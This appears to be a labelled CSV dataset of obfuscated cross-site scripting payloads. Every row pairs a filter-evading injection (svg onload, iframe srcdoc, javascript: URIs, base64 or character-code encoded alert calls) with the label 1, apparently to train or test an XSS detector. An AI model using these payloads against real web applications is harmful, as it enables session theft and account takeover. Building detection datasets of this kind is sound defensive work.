"<svg onload=""setTimeout(function(){let a=atob('YWxlcnQoMSk=');eval(a)},0)"">",1
"<iframe srcdoc=""<svg onload=parent[atob('YWxlcnQ=')](1)>"">",1
"<svg onload=""window['\u0061\u006c\u0065\u0072\u0074'](1)""></svg>",1
<svg onload=window[`al`+`ert`](1)>,1
"<svg xmlns=""http://www.w3.org/2000/svg"" onload=""eval(atob('YWxlcnQoMSk='))""></svg>",1
<svg onload=eval(window['atob']('YWxlcnQoMSk='))>,1
"<iframe srcdoc=""<img src=x onerror=setTimeout(&#x27;&#x61;&#x6C;&#x65;&#x72;&#x74;(1)&#x27;,0)>""></iframe>",1
"<iframe src=""javascript:eval(atob('YWxlcnQoMSk='))"">",1
<svg onload=window['al'+'ert']('X'+'SS')>,1
"<details open ontoggle='eval(""al""+""ert(1)"")'></details>",1
"<object data=""data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>window['al'+'ert'](7)</script></svg>""></object>",1
"<iframe srcdoc=""<script>eval(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+'(document.domain)')</script>"">",1
"<iframe srcdoc=""<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>""></iframe>",1
"<svg onload=setTimeout('al'+'ert(123)',0)>",1
<svg onload=window['al'+'ert'](atob('MTEz'))>,1
"<iframe srcdoc=""<svg onload=setTimeout(`al`+`ert(1)`,0)></svg>""></iframe>",1
"<iframe src=""javascript:eval(String.fromCharCode(97,108,101,114,116,40,49,41))""></iframe>",1
"<svg onload=""eval(String['fr'+'omC'+'harC'+'ode'](97,108,101,114,116,40,39,88,83,83,39,41))"">",1
"<svg onload=""setTimeout(() => window['al'+'ert'](1), 0)"">",1
"<iframe srcdoc=""<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))></svg>""></iframe>",1
"<iframe srcdoc=""<script>Function('al'+'ert(16)')()</script>""></iframe>",1
"<iframe srcdoc=""<svg onload=eval(`\\u0061\\u006c\\u0065\\u0072\\u0074(1)`)></svg>""></iframe>",1
"<object data='data:text/html,<svg onload=alert(String.fromCharCode(49))>'></object>",1
"<iframe srcdoc=""<svg onload=setInterval('al'+'ert(1)',1000)>""></iframe>",1
"<iframe srcdoc=""<script>setInterval(()=>window['alert'](1),1000)</script>""></iframe>",1
